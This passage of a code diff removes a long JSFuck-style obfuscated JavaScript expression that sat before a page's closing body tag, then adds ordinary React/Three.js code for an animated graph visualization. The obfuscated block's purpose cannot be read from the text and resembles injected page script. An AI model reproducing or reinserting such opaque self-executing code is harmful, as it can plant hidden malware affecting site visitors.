]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])](([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[!+[]+!+[]]+(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]][[+[]]])
-</script>
-</body>
+  const centered = frames.map(([p, c]) => {
+    const out = new Float32Array(p.length);
+    for (let i = 0; i < p.length; i += 3) {
+      out[i] = p[i] - cx;
+      out[i + 1] = p[i + 1] - cy;
+      out[i + 2] = p[i + 2] || 0;
+    }
+    return [out, c];
+  });
+
+
+  /* 4) Links (gracefully handle missing file) */
+  const linksByType = (await safeLoadGZJSON('./links.json.gz')) || {
+    getLinks: [],
+    logicLinks: [],
+    hierarchyRelation: []
+  };
+
+  //console.log('Loaded data:', { frames: centered.length, linksByType });
+  return { frames: centered, linksByType };
+}
+/* ================= Inline worker (no-transfer → no detach) ================= */
+const workerCode = `
+    function lerp(a,b,t){ return a + (b-a)*t; }
+    onmessage = (e)=>{
+      let [ nodesFrom, nodesTo, edgesFrom, edgesTo, relations ] = e.data;
+      const factor = 0.05;
+      let i=0, total = (nodesTo.length/3);
+      while(total>i){
+        const v3=i*3; const ff = factor - (i/total)/100.0;
+        nodesFrom[v3]   = lerp(nodesFrom[v3],   nodesTo[v3],   ff);
+        nodesFrom[v3+1] = lerp(nodesFrom[v3+1], nodesTo[v3+1], ff);
+        nodesFrom[v3+2] = lerp(nodesFrom[v3+2], nodesTo[v3+2], ff);
+        i++;
+      }
+      i=0;
+      while(relations.length>i){
+        const v3=i*3, f3=relations[i].from*3, t3=relations[i].to*3;
+        edgesFrom[v3]   = nodesFrom[f3];
+        edgesFrom[v3+1] = nodesFrom[f3+1];
+        edgesFrom[v3+2] = nodesFrom[f3+2];
+        edgesTo[v3]     = nodesFrom[t3];
+        edgesTo[v3+1]   = nodesFrom[t3+1];
+        edgesTo[v3+2]   = nodesFrom[t3+2];
+        i++;
+      }
+      postMessage([nodesFrom, edgesFrom, edgesTo]);
+    };
+  `;
+
+function makeWorker() {
+  try { const blob = new Blob([workerCode], { type: 'text/javascript' }); const url = URL.createObjectURL(blob); return new Worker(url); } catch { return null; }
+}
+
+/* ================= Nodes ================= */
+function NodeCloud({ state }) {
+  const { camera } = useThree();
+  const root = React.useRef();
+  const geo = React.useRef();
+  const mat = React.useRef();
+  const base = React.useMemo(() => new THREE.CircleGeometry(2, 24), []);
+
+  React.useEffect(() => {
+    const g = new THREE.InstancedBufferGeometry();
+    g.index = base.index;
+    g.attributes.position = base.attributes.position;
+    g.attributes.normal = base.attributes.normal || undefined;
+    g.attributes.uv = base.attributes.uv || undefined;
+    geo.current = g;
+    const m = new THREE.ShaderMaterial(nodeShader);
+    mat.current = m;
+    const mesh = new THREE.Mesh(g, m);
+    mesh.frustumCulled = false;
+    root.current.add(mesh);
+    return () => {
+      g.dispose();
+      m.dispose();
+      root.current.remove(mesh);
+    };
+  }, [base]);
+
+  React.useEffect(() => {
+    if (!state.nodesFrom) return;
+    const count = state.nodesFrom.length / 3;
+    const g = geo.current;
+    g.setAttribute('instancePosition', new THREE.InstancedBufferAttribute(new Float32Array(count * 3), 3));
+    g.setAttribute('instanceColor', new THREE.InstancedBufferAttribute(new Float32Array(count * 3), 3));
+    g.setAttribute('instanceScale', new THREE.InstancedBufferAttribute(new Float32Array(count), 1));
+    g.setAttribute('instanceOpacity', new THREE.InstancedBufferAttribute(new Float32Array(count), 1));
+    g.getAttribute('instanceColor').set(state.colFrom);
+    const sWorld = pxToWorld(NODE_PX, state.camZ, camera.fov, state.viewportH);
+    const sca = g.getAttribute('instanceScale'),
+      opa = g.getAttribute('instanceOpacity');
+    for (let i = 0; i < sca.count; i++) {
+      sca.array[i] = sWorld;
+      opa.array[i] = 1.0;
+    }
+    sca.needsUpdate = opa.needsUpdate = true;
+    g.getAttribute('instanceColor').needsUpdate = true;
+  }, [state.nodesFrom]);
+
+  useFrame(() => {
+    if (!geo.current || !mat.current) return;
+    mat.current.uniforms.paillette.value += 0.03;
+
+    if (state.nodesFrom) {
+      const posA = geo.current.getAttribute('instancePosition');
+      if (posA && posA.array.length === state.nodesFrom.length) {
+        posA.array.set(state.nodesFrom);
+        posA.needsUpdate = true;
+      }
+    }
+    if (state.colFrom && state.colTo) {
+      const a = 0.18;
+      for (let i = 0; i < state.colTo.length; i++) state.colFrom[i] += (state.colTo[i] - state.colFrom[i]) * a;
+      const colA = geo.current.getAttribute('instanceColor');
+      if (colA && colA.array.length === state.colFrom.length) {
+        colA.array.set(state.colFrom);
+        colA.needsUpdate = true;
+      }
+    }
+    if (state.needsScaleUpdate) {
+      const sca = geo.current.getAttribute('instanceScale');
+      if (sca) {
+        const sWorld = pxToWorld(NODE_PX, state.camZ, state.fov, state.viewportH);
+        for (let i = 0; i < sca.count; i++) sca.array[i] = sWorld;
+        sca.needsUpdate = true;
+        state.needsScaleUpdate = false;
+      }
+    }
+  });
+
+  return React.createElement('group', { ref: root });
+}
+
+/* ================= Edges ================= */
+function Edges({ state }) {
+  const root = React.useRef();
+  const geo = React.useRef();
+  const mat = React.useRef();
+  const quad = React.useMemo(() => {
+    const g = new THREE.BufferGeometry();
+    const a = new Float32Array([-1, 0, 0, 1, 0, 0, -1, 1, 0, -1, 1, 0, 1, 0, 0, 1, 1, 0]);
+    g.setAttribute('position', new THREE.BufferAttribute(a, 3));
+    return g;
+  }, []);
+
+  React.useEffect(() => {
+    const g = new THREE.InstancedBufferGeometry();
+    g.index = null;
+    g.attributes.position = quad.attributes.position;
+    geo.current = g;
+    const m = new THREE.ShaderMaterial(edgeShader);
+    // Optional: additive Blending lässt Linien „glühen“
+    m.blending = THREE.AdditiveBlending;
+    m.transparent = true;
+    m.depthTest = false;
+    m.depthWrite = false;
+    m.uniforms.width.value = edgeClipFromPx(EDGE_PX_EMPH);
+    mat.current = m;
+    const mesh = new THREE.Mesh(g, m);
+    mesh.frustumCulled = false;
+    root.current.add(mesh);
+    return () => {
+      g.dispose();
+      m.dispose();
+      root.current.remove(mesh);
+    };
+  }, [quad]);
+
+  React.useEffect(() => {
+    if (!state.edgePairs) return;
+    const n = state.edgePairs.length,
+      g = geo.current;
+    g.setAttribute('instanceFrom', new THREE.InstancedBufferAttribute(new Float32Array(n * 3), 3));
+    g.setAttribute('instanceTo', new THREE.InstancedBufferAttribute(new Float32Array(n * 3), 3));
+    if (mat.current) {
+      mat.current.uniforms.resolution.value.set(state.viewportW, state.viewportH);
+      mat.current.uniforms.opacity.value = state.edgeOpacity;
+      mat.current.uniforms.width.value = edgeClipFromPx(state.edgeWidthPx);
+    }
+  }, [state.edgePairs, state.viewportW, state.viewportH, state.edgeOpacity]);
+
+  useFrame(() => {
+    if (!geo.current || !state.edgesFrom || !state.edgesTo) return;
+    const fromA = geo.current.getAttribute('instanceFrom');
+    const toA = geo.current.getAttribute('instanceTo');
+    if (fromA && toA && fromA.array.length === state.edgesFrom.length && toA.array.length === state.edgesTo.length) {
+      fromA.array.set(state.edgesFrom);
+      toA.array.set(state.edgesTo);
+      fromA.needsUpdate = true;
+      toA.needsUpdate = true;
+    }
+    if (mat.current) {
+      // Live-Spiegelung: Breite & Opacity pro Frame aus state
+      const wantW = edgeClipFromPx(state.edgeWidthPx);
+      if (mat.current.uniforms.width.value !== wantW) mat.current.uniforms.width.value = wantW;
+      if (mat.current.uniforms.opacity.value !== state.edgeOpacity) mat.current.uniforms.opacity.value = state.edgeOpacity;
+    }
+  });
+
+  return React.createElement('group', { ref: root });
+}
+
+/* ================= Camera sync ================= */
+function CameraSync({ state }) {
+  const { camera, gl } = useThree();
+  React.useEffect(() => {
+    camera.fov = state.fov;
+    camera.near = CAMERA_NEAR;
+    camera.far = CAMERA_FAR;
+    camera.updateProjectionMatrix();
+  }, [camera, state.fov]);
+  React.useEffect(() => {
+    gl.setPixelRatio(state.dpr);
+    gl.setSize(state.viewportW, state.viewportH, false);
+    gl.outputColorSpace = THREE.SRGBColorSpace;
+    gl.toneMapping = THREE.ACESFilmicToneMapping;
+    gl.toneMappingExposure = 1.2;
+  }, [gl, state.viewportW, state.viewportH, state.dpr]);
+
+  useFrame(() => {
+    if (!state.cameraPos) state.cameraPos = [0, 0, 0];
+    state.cameraPos[0] = camera.position.x;
+    state.cameraPos[1] = camera.position.y;
+    state.cameraPos[2] = camera.position.z;
+  });
+  return null;
+}
+
+/* ================= App / Scene ================= */
+function App() {
+  const [data, setData] = React.useState(null);
+  React.useEffect(() => {
+    (async () => {
+      try {
+        setData(await loadFramesAndLinks());
+      } catch (e) {
+        console.log(e.message);
+        console.error('Failed to load data.');
+      }
+    })();
+  }, []);
+  return data ? React.createElement(Scene, { data }) : null;
+}
+
+function Scene({ data }) {
+  const [dims, setDims] = React.useState({ w: innerWidth, h: innerHeight, dpr: Math.min(devicePixelRatio || 1, 2) });
+  React.useEffect(() => {
+    const onR = () => setDims({ w: innerWidth, h: innerHeight, dpr: Math.min(devicePixelRatio || 1, 2) });
+    addEventListener('resize', onR, { passive: true });
+    return () => removeEventListener('resize', onR);
+  }, []);
+
+  const [uiStep, setUiStep] = React.useState(1);
+  const [bg, setBg] = React.useState(BACKG[0]);
+  React.useEffect(() => setBG(bg), [bg]);
+
+  const [settings, setSettings] = React.useState({
+    layout: Object.keys(layouts)[0],
+    edges: { display: true, opacity: 0.0, width: EDGE_PX_EMPH },
+    axises: {},
+  });
+
+  const state = React.useRef({
+    viewportW: dims.w,
+    viewportH: dims.h,
+    dpr: dims.dpr,
+    fov: FOV,
+    camZ: dims.h * 0.5 / ratio(),
+    needsScaleUpdate: true,
+    nodesFrom: null,
+    nodesTo: null,
+    colFrom: null,
+    colTo: null,
+    edgesFrom: null,
+    edgesTo: null,
+    edgePairs: [],
+    edgeOpacity: 0.0,
+    edgeWidthPx: EDGE_PX_EMPH,
+  }).current;
+
+  const setEdgeOpacity = (o) => { state.edgeOpacity = o; };
+  const setEdgeWidthPx = (px) => { state.edgeWidthPx = px; };
+  const setBackground = (c) => setBg(c);
+  const setStep = (s) => setUiStep(s);
+
+  React.useEffect(() => {
+    state.viewportW = dims.w;
+    state.viewportH = dims.h;
+    state.dpr = dims.dpr;
+    state.fov = FOV;
+    state.needsScaleUpdate = true;
+  }, [dims]);
+
+  React.useEffect(() => {
+    const [p0, c0] = data.frames[0];
+    state.nodesFrom = new Float32Array(p0);
+    state.nodesTo = new Float32Array(p0);
+    state.colFrom = new Float32Array(c0);
+    state.colTo = new Float32Array(c0);
+    setLayoutEdges(settings.layout);
+    setBg(BACKG[0]);
+    setUiStep(1);
+    startLerpLoop();
+  }, []);
+
+  React.useEffect(() => { setLayoutEdges(settings.layout); }, [settings.layout]);
+
+  function setLayoutEdges(layoutKey) {
+    const key = linksKeyForLayout(layoutKey);
+    const raw = data.linksByType[key] || [];
+    const pairs = dedupeLinks(raw);
+    state.edgePairs = pairs;
+    state.edgesFrom = new Float32Array(pairs.length * 3);
+    state.edgesTo = new Float32Array(pairs.length * 3);
+  }
+
+  const frameRef = React.useRef(0);
+
+  const bumpFrame = React.useCallback(() => {
+    frameRef.current = (frameRef.current + 1) % data.frames.length
+    const [p, c] = data.frames[frameRef.current];
+    state.nodesTo.set(p);
+    state.colTo.set(c);
+  }, [data.frames, state]);
+
+  /* ---- LERP loop (worker or main) ---- */
+  let worker = null;
+
+  function startLerpLoop() {
+    worker = makeWorker();
+    if (worker) {
+      worker.onmessage = (e) => {
+        const [nodesFromArr, edgesFromArr, edgesToArr] = e.data;
+        state.nodesFrom = nodesFromArr;
+        state.edgesFrom = edgesFromArr;
+        state.edgesTo = edgesToArr;
+        state.workerTicks++;
+        requestAnimationFrame(tick);
+      };
+      requestAnimationFrame(tick);
+    } else {
+      requestAnimationFrame(tickFallback);
+    }
+  }
+
+  function tick() {
+    worker.postMessage([state.nodesFrom, state.nodesTo, state.edgesFrom, state.edgesTo, state.edgePairs]);
+  }
+
+  function tickFallback() {
+    const factor = 0.05,
+      nf = state.nodesFrom,
+      nt = state.nodesTo;
+    let i = 0,
+      total = nt.length / 3;
+    while (total > i) {
+      const v3 = i * 3,
+        ff = factor - (i / total) / 100;
+      nf[v3] += (nt[v3] - nf[v3]) * ff;
+      nf[v3 + 1] += (nt[v3 + 1] - nf[v3 + 1]) * ff;
+      nf[v3 + 2] += (nt[v3 + 2] - nf[v3 + 2]) * ff;
+      i++;
+    }
+    i = 0;
+    while (state.edgePairs.length > i) {
+      const v3 = i * 3,
+        f3 = state.edgePairs[i].from * 3,
+        t3 = state.edgePairs[i].to * 3;
+      state.edgesFrom[v3] = nf[f3];
